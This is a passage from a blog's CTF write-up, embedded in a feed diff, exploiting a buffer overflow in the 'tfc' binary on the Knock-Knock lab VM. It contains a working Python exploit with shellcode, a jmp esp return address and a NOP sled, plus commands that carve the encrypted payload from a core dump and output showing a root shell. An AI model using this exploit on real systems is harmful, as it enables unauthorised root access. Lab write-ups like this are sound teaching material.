+</span><span class='line'>[tfc]
+</span><span class='line'>0x08048e93 jmp esp
+</span><span class='line'>0x08048e93 jmp esp</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Then use msf with payload (<font color="red"><em>linux/x86/exec</em></font>) to generate shellcode</p>
+
+<p><img class="left" src="/downloads/knock-knock/13.png"></p>
+
+<p><code>-b</code> switch will blacklist special characters.</p>
+
+<p>Then I wrote a python script to output payload with shellcode.</p>
+
+<p><figure class='code'><figcaption><span>payload.py  (payload.py)</span> <a href='/downloads/code/payload.py'>download</a></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#/usr/bin/python</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">shellcode</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\xb8\x87\x10\x54\x8e\xd9\xc3\xd9\x74\x24\xf4\x5e\x29\xc9\xb1\x0b\x31\x46\x15\x83\xc6\x04\x03\x46\x11\xe2\x72\x7a\x5f\xd6\xe5\x29\x39\x8e\x38\xad\x4c\xa9\x2a\x1e\x3c\x5e\xaa\x08\xed\xfc\xc3\xa6\x78\xe3\x41\xdf\x73\xe4\x65\x1f\xab\x86\x0c\x71\x9c\x35\xa6\x8d\xb5\xea\xbf\x6f\xf4\x8d</span><span class="s">&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">content</span> <span class="o">=</span> <span class="s">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">4124</span>
+</span><span class='line'><span class="n">content</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x93\x8e\x04\x08</span><span class="s">&quot;</span>				<span class="c"># 0x08048e93 jmp esp</span>
+</span><span class='line'><span class="n">content</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span> <span class="o">*</span> <span class="mi">20</span> 						<span class="c"># padding 20 NOPs to protect shellcode</span>
+</span><span class='line'><span class="n">content</span> <span class="o">+=</span> <span class="n">shellcode</span>
+</span><span class='line'><span class="n">content</span> <span class="o">+=</span> <span class="s">&#39;C&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">5000</span> <span class="o">-</span> <span class="mi">4124</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">-</span><span class="mi">20</span> <span class="o">-</span><span class="mi">70</span><span class="p">)</span>	<span class="c"># padding with &#39;C&#39;</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="n">content</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Next, use <code>tfc</code> program to encrypt the payload and dump the encrypted data from core dump</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Knock# python payload.py > in.tfc
+</span><span class='line'>root@kali:~/Knock# ./tfc in.tfc out.tfc
+</span><span class='line'>Segmentation fault (core dumped)
+</span><span class='line'>root@kali:~/Knock# xxd /tmp/core-tfc-11-0-0-18419-1434802506 | grep &lsquo;def0 5bab&rsquo;
+</span><span class='line'>0034340: def0 5bab 5df7 ab43 0690 fe64 6cb0 0b48  ..[.]..C&hellip;dl..H</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Then use <code>dd</code> to carve out the encrypted data, byte by byte, skipping the first 213824 bytes (0034340 in HEX) and count is the length of exploit payload (5000 bytes)</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Knock# dd if=/tmp/core-tfc-11-0-0-18419-1434802506 of=exp.tfc skip=213824 count=5000 bs=1
+</span><span class='line'>5000+0 records in
+</span><span class='line'>5000+0 records out
+</span><span class='line'>5000 bytes (5.0 kB) copied, 0.0723968 s, 69.1 kB/s</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Now try to exploit &lsquo;tfc&rsquo; program with the encrypted exploit payload (exp.tfc):</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Knock# ./tfc exp.tfc pwn.tfc&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>id&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;p>uid=0(root) gid=0(root) groups=0(root)&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>exit&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>
+
+<p>Cool, it works on my Kali!</p>
+
+<p>Now, upload <code>exp.tfc</code> to target machine and exploit <code>tfc</code> to get ROOT!</p>
+
+<p><img class="left" src="/downloads/knock-knock/14.png"></p>
+
+<p>Done :)</p>
+]]></content>
+  </entry>
+  
+</feed>
